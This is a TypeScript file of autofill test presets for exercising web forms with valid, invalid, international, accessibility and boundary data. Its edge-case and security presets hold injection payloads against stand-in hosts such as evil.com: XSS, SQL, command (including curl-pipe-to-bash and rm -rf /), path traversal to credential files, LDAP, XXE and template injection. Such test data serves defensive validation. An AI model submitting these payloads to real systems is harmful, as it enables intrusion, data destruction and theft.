/**
 * Test Scenario Presets for Autofill
 * One-click presets for different testing scenarios
 *
 * Scenarios:
 * - Happy Path: Perfect valid data
 * - Edge Cases: XSS, SQL injection, max length, unicode
 * - Validation: Invalid emails, malformed phones, future birthdates
 * - i18n Testing: International names, addresses, RTL text
 * - Accessibility: Screen reader friendly patterns
 */

import type { Dataset } from "./types";

// ============================================================================
// SCENARIO TYPES
// ============================================================================

export type TestScenario =
  | "happy-path"
  | "edge-cases"
  | "validation"
  | "i18n"
  | "accessibility"
  | "security"
  | "boundary";

export interface ScenarioPreset {
  id: TestScenario;
  name: string;
  description: string;
  icon: string;
  color: string;
  datasets: Dataset[];
}

// ============================================================================
// HAPPY PATH - Perfect Valid Data
// ============================================================================

const HAPPY_PATH_DATASETS: Dataset[] = [
  {
    id: "happy-1",
    name: "Standard User",
    category: "happy-path",
    data: {
      email: "john.smith@company.com",
      name: "John Smith",
      firstName: "John",
      lastName: "Smith",
      phone: "+1 (555) 123-4567",
      address: "123 Main Street",
      city: "New York",
      state: "NY",
      zip: "10001",
      country: "United States",
      company: "Acme Corporation",
      title: "Software Engineer",
      website: "https://johnsmith.com",
      message: "This is a standard test message for form validation.",
      number: "42",
    },
  },
  {
    id: "happy-2",
    name: "Premium User",
    category: "happy-path",
    data: {
      email: "jane.doe@enterprise.io",
      name: "Jane Doe",
      firstName: "Jane",
      lastName: "Doe",
      phone: "+1 (555) 987-6543",
      address: "456 Oak Avenue, Suite 200",
      city: "San Francisco",
      state: "CA",
      zip: "94102",
      country: "United States",
      company: "Tech Innovations Inc.",
      title: "Product Manager",
      website: "https://janedoe.io",
      message: "Looking forward to connecting with your team!",
      number: "100",
    },
  },
];

// ============================================================================
// EDGE CASES - XSS, SQL Injection, Special Characters
// ============================================================================

const EDGE_CASE_DATASETS: Dataset[] = [
  {
    id: "edge-xss",
    name: "XSS Attempt",
    category: "edge-cases",
    data: {
      email: 'test<script>alert("xss")</script>@test.com',
      name: '<img src=x onerror=alert("XSS")>',
      firstName: '<script>alert("XSS")</script>',
      lastName: '"><img src=x onerror=alert(1)>',
      phone: '<svg onload=alert("XSS")>',
      address: 'javascript:alert("XSS")',
      city: '<iframe src="javascript:alert(1)">',
      message: '{{constructor.constructor("alert(1)")()}}',
      website: "javascript:alert(document.domain)",
      number: '<script>fetch("evil.com")</script>',
    },
  },
  {
    id: "edge-sql",
    name: "SQL Injection",
    category: "edge-cases",
    data: {
      email: "'; DROP TABLE users; --@test.com",
      name: "Robert'); DROP TABLE Students;--",
      firstName: "' OR '1'='1",
      lastName: "'; DELETE FROM users WHERE '1'='1",
      phone: "1' OR '1'='1",
      address: "1; UPDATE users SET admin=true;--",
      message: "UNION SELECT * FROM passwords--",
      company: "'; EXEC xp_cmdshell('dir'); --",
      number: "1 OR 1=1",
    },
  },
  {
    id: "edge-unicode",
    name: "Unicode & Emoji",
    category: "edge-cases",
    data: {
      email: "test🔥@example.com",
      name: "🎉 Party Person 🎊",
      firstName: "Ñoño",
      lastName: "Müller-Östergård",
      phone: "☎️ 555-1234",
      address: "١٢٣ الشارع الرئيسي",
      city: "東京",
      state: "日本",
      message: "👋 Hello! 你好! مرحبا! 🌍",
      company: "株式会社テスト",
      number: "①②③",
    },
  },
  {
    id: "edge-maxlength",
    name: "Max Length Strings",
    category: "edge-cases",
    data: {
      email:
        "verylongemailaddressthatmightbreakvalidation1234567890abcdefghijklmnopqrstuvwxyz@verylongdomainnamethatmightcauseissues.com",
      name: "A".repeat(500),
      firstName: "Bartholomew-Christopher-Alexander-Maximilian-Montgomery",
      lastName: "Van Der Berg-Schmidt-Johannson-Christopherson-Williams",
      phone: "+1 (555) 123-4567 ext. 12345678901234567890",
      address:
        "12345 Very Long Street Name That Goes On And On Boulevard, Apartment 99999, Building Z, Floor 100",
      city: "Llanfairpwllgwyngyllgogerychwyrndrobwllllantysiliogogogoch",
      message: "Lorem ipsum dolor sit amet, ".repeat(100),
      number: "99999999999999999999999999999999",
    },
  },
  {
    id: "edge-empty",
    name: "Empty/Whitespace",
    category: "edge-cases",
    data: {
      email: "   ",
      name: "\t\n\r",
      firstName: "",
      lastName: "   ",
      phone: "\u200B\u200B\u200B", // Zero-width spaces
      address: "\n\n\n",
      city: "​", // Zero-width space
      message: "                    ",
      number: "   0   ",
    },
  },
  {
    id: "edge-special",
    name: "Special Characters",
    category: "edge-cases",
    data: {
      email: "test+special&chars=true@example.com",
      name: "O'Brien-McDonald & Sons, Ltd.",
      firstName: "Jean-François",
      lastName: "O'Connor",
      phone: "+1 (555) 123-4567 #123",
      address: "123 Main St. #456 & Suite 789",
      city: "St. Louis",
      state: "D.C.",
      company: "AT&T / Verizon (Partnership)",
      message:
        "Test: \"quotes\", 'apostrophes', <angles>, {braces}, [brackets]",
      website: "https://example.com/path?query=value&other=123#anchor",
      number: "+1.5e10",
    },
  },
];

// ============================================================================
// VALIDATION - Invalid Data for Testing Validators
// ============================================================================

const VALIDATION_DATASETS: Dataset[] = [
  {
    id: "valid-invalid-email",
    name: "Invalid Emails",
    category: "validation",
    data: {
      email: "notanemail",
      name: "Email Tester",
      firstName: "Invalid",
      lastName: "Email",
      phone: "+1 (555) 123-4567",
    },
  },
  {
    id: "valid-missing-at",
    name: "Email Missing @",
    category: "validation",
    data: {
      email: "userexample.com",
      name: "Missing At",
    },
  },
  {
    id: "valid-invalid-phone",
    name: "Invalid Phone Numbers",
    category: "validation",
    data: {
      phone: "abc-def-ghij",
      email: "test@test.com",
      name: "Phone Tester",
    },
  },
  {
    id: "valid-short-phone",
    name: "Too Short Phone",
    category: "validation",
    data: {
      phone: "123",
      email: "short@test.com",
      name: "Short Phone",
    },
  },
  {
    id: "valid-future-date",
    name: "Future Birthdate",
    category: "validation",
    data: {
      email: "future@test.com",
      name: "Future Person",
      date: "2099-12-31",
      number: "-5", // Negative age
    },
  },
  {
    id: "valid-invalid-zip",
    name: "Invalid Zip Codes",
    category: "validation",
    data: {
      zip: "ABCDE",
      email: "zip@test.com",
      name: "Zip Tester",
      state: "XX", // Invalid state
      country: "Atlantis",
    },
  },
  {
    id: "valid-invalid-url",
    name: "Invalid URLs",
    category: "validation",
    data: {
      website: "not a valid url",
      email: "url@test.com",
      name: "URL Tester",
    },
  },
  {
    id: "valid-mismatched",
    name: "Mismatched Data",
    category: "validation",
    data: {
      email: "john@company.com",
      firstName: "Jane", // Different name in email vs first name
      lastName: "Doe",
      name: "Different Name",
      phone: "+44 20 1234 5678", // UK phone with US address
      city: "New York",
      zip: "10001",
      country: "United Kingdom", // Mismatched
    },
  },
];

// ============================================================================
// I18N - International Testing
// ============================================================================

const I18N_DATASETS: Dataset[] = [
  {
    id: "i18n-japanese",
    name: "Japanese (日本語)",
    category: "i18n",
    data: {
      email: "tanaka@example.co.jp",
      name: "田中太郎",
      firstName: "太郎",
      lastName: "田中",
      phone: "+81 3-1234-5678",
      address: "東京都渋谷区神宮前1-2-3",
      city: "東京",
      state: "東京都",
      zip: "150-0001",
      country: "日本",
      company: "株式会社サンプル",
      title: "ソフトウェアエンジニア",
      message: "お問い合わせありがとうございます。よろしくお願いいたします。",
    },
  },
  {
    id: "i18n-chinese",
    name: "Chinese (中文)",
    category: "i18n",
    data: {
      email: "wangwei@example.cn",
      name: "王伟",
      firstName: "伟",
      lastName: "王",
      phone: "+86 10-1234-5678",
      address: "北京市朝阳区建国路100号",
      city: "北京",
      state: "北京市",
      zip: "100020",
      country: "中国",
      company: "示例科技有限公司",
      message: "您好，感谢您的关注！期待与您合作。",
    },
  },
  {
    id: "i18n-arabic",
    name: "Arabic (العربية)",
    category: "i18n",
    data: {
      email: "ahmed@example.ae",
      name: "أحمد محمد",
      firstName: "أحمد",
      lastName: "محمد",
      phone: "+971 4-123-4567",
      address: "شارع الشيخ زايد، برج خليفة",
      city: "دبي",
      state: "دبي",
      zip: "00000",
      country: "الإمارات العربية المتحدة",
      company: "شركة التقنية",
      message: "شكراً لتواصلكم معنا. نتطلع للتعاون معكم.",
    },
  },
  {
    id: "i18n-german",
    name: "German (Deutsch)",
    category: "i18n",
    data: {
      email: "hans.mueller@beispiel.de",
      name: "Hans Müller",
      firstName: "Hans",
      lastName: "Müller",
      phone: "+49 30 12345678",
      address: "Hauptstraße 42, Wohnung 5",
      city: "Berlin",
      state: "Berlin",
      zip: "10115",
      country: "Deutschland",
      company: "Beispiel GmbH",
      title: "Softwareentwickler",
      message:
        "Vielen Dank für Ihre Nachricht. Ich freue mich auf unsere Zusammenarbeit.",
    },
  },
  {
    id: "i18n-russian",
    name: "Russian (Русский)",
    category: "i18n",
    data: {
      email: "ivan@primer.ru",
      name: "Иван Иванов",
      firstName: "Иван",
      lastName: "Иванов",
      phone: "+7 495 123-45-67",
      address: "ул. Тверская, д. 1, кв. 10",
      city: "Москва",
      state: "Москва",
      zip: "125009",
      country: "Россия",
      company: "ООО Пример",
      message: "Спасибо за ваше сообщение. С нетерпением жду сотрудничества.",
    },
  },
  {
    id: "i18n-korean",
    name: "Korean (한국어)",
    category: "i18n",
    data: {
      email: "kim@example.kr",
      name: "김민수",
      firstName: "민수",
      lastName: "김",
      phone: "+82 2-1234-5678",
      address: "서울특별시 강남구 테헤란로 123",
      city: "서울",
      state: "서울특별시",
      zip: "06234",
      country: "대한민국",
      company: "예시 주식회사",
      message: "문의해 주셔서 감사합니다. 함께 일하기를 기대합니다.",
    },
  },
  {
    id: "i18n-hindi",
    name: "Hindi (हिंदी)",
    category: "i18n",
    data: {
      email: "raj@example.in",
      name: "राज शर्मा",
      firstName: "राज",
      lastName: "शर्मा",
      phone: "+91 11-1234-5678",
      address: "123, महात्मा गांधी मार्ग",
      city: "नई दिल्ली",
      state: "दिल्ली",
      zip: "110001",
      country: "भारत",
      company: "उदाहरण प्राइवेट लिमिटेड",
      message: "संपर्क करने के लिए धन्यवाद। आपसे मिलने की प्रतीक्षा है।",
    },
  },
];

// ============================================================================
// ACCESSIBILITY - Screen Reader Friendly
// ============================================================================

const ACCESSIBILITY_DATASETS: Dataset[] = [
  {
    id: "a11y-simple",
    name: "Simple Clear Text",
    category: "accessibility",
    data: {
      email: "user@example.com",
      name: "Alex Johnson",
      firstName: "Alex",
      lastName: "Johnson",
      phone: "555-123-4567",
      address: "100 First Street",
      city: "Portland",
      state: "Oregon",
      zip: "97201",
      country: "United States",
      message:
        "Hello. I am interested in learning more. Please contact me at your earliest convenience. Thank you.",
      number: "fifty",
    },
  },
  {
    id: "a11y-spelled",
    name: "Spelled Out Numbers",
    category: "accessibility",
    data: {
      email: "test@example.com",
      name: "Test User",
      phone: "five five five one two three four five six seven",
      zip: "nine seven two zero one",
      number: "twenty-five",
      message:
        "Contact me at five five five, one two three, four five six seven.",
    },
  },
];

// ============================================================================
// SECURITY - OWASP Top 10 Testing
// ============================================================================

const SECURITY_DATASETS: Dataset[] = [
  {
    id: "sec-path-traversal",
    name: "Path Traversal",
    category: "security",
    data: {
      email: "test@test.com",
      name: "../../../etc/passwd",
      firstName: "..\\..\\..\\windows\\system32\\config\\sam",
      address: "file:///etc/passwd",
      website: "....//....//....//etc/passwd",
      message: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    },
  },
  {
    id: "sec-command-injection",
    name: "Command Injection",
    category: "security",
    data: {
      email: "test@test.com; cat /etc/passwd",
      name: "$(whoami)",
      firstName: "`id`",
      lastName: "| ls -la",
      message: "; rm -rf / --no-preserve-root",
      company: "&& curl evil.com/shell.sh | bash",
    },
  },
  {
    id: "sec-ldap-injection",
    name: "LDAP Injection",
    category: "security",
    data: {
      email: "*)(uid=*))(|(uid=*",
      name: "admin)(&)",
      firstName: "*",
      lastName: "*)((|userPassword=*",
    },
  },
  {
    id: "sec-xxe",
    name: "XXE Payload",
    category: "security",
    data: {
      email: "test@test.com",
      name: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      message: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
    },
  },
  {
    id: "sec-ssti",
    name: "Server-Side Template Injection",
    category: "security",
    data: {
      email: "{{7*7}}@test.com",
      name: "${7*7}",
      firstName: "<%= 7*7 %>",
      lastName: "#{7*7}",
      message:
        "{{constructor.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()}}",
    },
  },
];

// ============================================================================
// BOUNDARY - Edge Values
// ============================================================================

const BOUNDARY_DATASETS: Dataset[] = [
  {
    id: "bound-zero",
    name: "Zero Values",
    category: "boundary",
    data: {
      number: "0",
      zip: "00000",
      phone: "000-000-0000",
      email: "0@0.com",
      name: "0",
    },
  },
  {
    id: "bound-negative",
    name: "Negative Values",
    category: "boundary",
    data: {
      number: "-1",
      zip: "-12345",
      phone: "-555-123-4567",
      email: "negative@test.com",
      name: "Negative Tester",
    },
  },
  {
    id: "bound-max-int",
    name: "Max Integer",
    category: "boundary",
    data: {
      number: "2147483647", // Max 32-bit signed int
      email: "maxint@test.com",
      name: "Max Integer",
    },
  },
  {
    id: "bound-overflow",
    name: "Integer Overflow",
    category: "boundary",
    data: {
      number: "9999999999999999999999999999999999999999",
      email: "overflow@test.com",
      name: "Overflow Test",
    },
  },
  {
    id: "bound-float",
    name: "Floating Point",
    category: "boundary",
    data: {
      number: "3.14159265358979323846",
      email: "float@test.com",
      name: "Float Test",
    },
  },
  {
    id: "bound-scientific",
    name: "Scientific Notation",
    category: "boundary",
    data: {
      number: "1.23e45",
      email: "science@test.com",
      name: "Scientific Test",
    },
  },
];

// ============================================================================
// PRESETS EXPORT
// ============================================================================

export const SCENARIO_PRESETS: ScenarioPreset[] = [
  {
    id: "happy-path",
    name: "Happy Path",
    description: "Perfect valid data for successful submissions",
    icon: "✅",
    color: "#10b981",
    datasets: HAPPY_PATH_DATASETS,
  },
  {
    id: "edge-cases",
    name: "Edge Cases",
    description: "XSS, SQL injection, unicode, max length strings",
    icon: "⚠️",
    color: "#f59e0b",
    datasets: EDGE_CASE_DATASETS,
  },
  {
    id: "validation",
    name: "Validation",
    description: "Invalid data to test form validators",
    icon: "❌",
    color: "#ef4444",
    datasets: VALIDATION_DATASETS,
  },
  {
    id: "i18n",
    name: "i18n Testing",
    description: "International names, addresses, RTL text",
    icon: "🌍",
    color: "#3b82f6",
    datasets: I18N_DATASETS,
  },
  {
    id: "accessibility",
    name: "Accessibility",
    description: "Screen reader friendly patterns",
    icon: "♿",
    color: "#8b5cf6",
    datasets: ACCESSIBILITY_DATASETS,
  },
  {
    id: "security",
    name: "Security",
    description: "OWASP Top 10 injection patterns",
    icon: "🔒",
    color: "#dc2626",
    datasets: SECURITY_DATASETS,
  },
  {
    id: "boundary",
    name: "Boundary",
    description: "Zero, negative, max, overflow values",
    icon: "📊",
    color: "#6366f1",
    datasets: BOUNDARY_DATASETS,
  },
];

/**
 * Get a preset by ID
 */
export function getPreset(id: TestScenario): ScenarioPreset | undefined {
  return SCENARIO_PRESETS.find((p) => p.id === id);
}

/**
 * Get datasets for a scenario
 */
export function getScenarioDatasets(id: TestScenario): Dataset[] {
  const preset = getPreset(id);
  return preset?.datasets || [];
}

/**
 * Get a random dataset from a scenario
 */
export function getRandomDatasetFromScenario(
  id: TestScenario
): Dataset | undefined {
  const datasets = getScenarioDatasets(id);
  if (datasets.length === 0) return undefined;
  return datasets[Math.floor(Math.random() * datasets.length)];
}
